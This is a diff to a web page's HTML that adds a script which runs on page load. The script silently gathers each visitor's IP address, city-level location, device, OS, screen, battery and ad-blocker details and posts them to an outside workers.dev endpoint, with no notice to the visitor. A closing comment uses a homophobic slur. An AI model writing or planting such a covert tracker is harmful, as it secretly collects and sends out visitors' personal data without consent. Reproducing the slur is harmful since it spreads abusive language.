@@ -19,11 +19,67 @@
   <source src="video/bg.mp4" type="video/mp4">
 </video>
 <script>
-fetch("https://hibitch.cetjeux.workers.dev", {
-  method: "POST",
-  headers: { "Content-Type": "application/json" },
-  body: JSON.stringify({ content: "New visitor" }),
-});
+async function getUserData() {
+  try {
+    const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json());
+    const ip = ipData.ip;
+    const screenSize = window.screen.width + 'x' + window.screen.height;
+    const language = navigator.language;
+    const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    const timestamp = new Date().toLocaleString();
+    const deviceType = /Mobi|Android/i.test(navigator.userAgent) ? "📱 Mobile" : "💻 Computer";
+    const online = navigator.onLine ? "🟢 Online" : "🔴 Offline";
+    const uptime = (performance.now() / 60000).toFixed(2) + " min";
+    const os = navigator.userAgentData?.platform || navigator.platform;
+    const cores = navigator.hardwareConcurrency;
+    const height = window.innerHeight + 'px';
+
+    let battery = "Unknown", powerMode = "Unknown";
+    if (navigator.getBattery) {
+      const b = await navigator.getBattery();
+      battery = (b.level * 100).toFixed(0) + "%";
+      powerMode = b.charging ? "No" : "Yes";
+    }
+
+    let adBlock = "Unknown";
+    try {
+      await fetch(new Request("https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js", {
+        method: 'HEAD', mode: 'no-cors'
+      })).then(() => adBlock = "❌ No", () => adBlock = "✅ Yes");
+    } catch { adBlock = "✅ Yes"; }
+
+    const locationData = await fetch("https://ipapi.co/" + ip + "/json/").then(r => r.json()).catch(() => ({}));
+    const location = `${locationData.city || "?"}, ${locationData.region || "?"}, ${locationData.country_name || "?"}`;
+
+    const payload = {
+      ip,
+      resolution: screenSize,
+      language,
+      timeZone,
+      timestamp,
+      deviceType,
+      onlineStatus: online,
+      uptime,
+      os,
+      cpuCores: cores,
+      navHeight: height,
+      batteryLevel: battery,
+      powerSavingMode: powerMode,
+      adBlockEnabled: adBlock,
+      location
+    };
+
+    await fetch("https://hibitch.cetjeux.workers.dev", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload)
+    });
+  } catch (e) {
+    console.error("Logger failed:", e);
+  }
+}
+
+window.onload = getUserData;
 </script>
 <!-- not clientside anymore faggot -->
 
